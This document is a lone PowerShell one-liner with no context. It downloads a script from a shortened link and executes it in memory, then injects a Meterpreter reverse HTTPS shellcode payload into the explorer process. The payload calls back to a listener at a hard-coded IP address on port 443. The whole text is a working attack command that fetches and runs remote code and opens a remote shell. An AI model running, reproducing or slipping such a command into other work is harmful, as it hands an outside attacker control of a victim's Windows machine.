iwr https://goo.gl/4QsWoj | iex; Invoke-Shellcode -ProcessId $((ps -Name explorer).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;
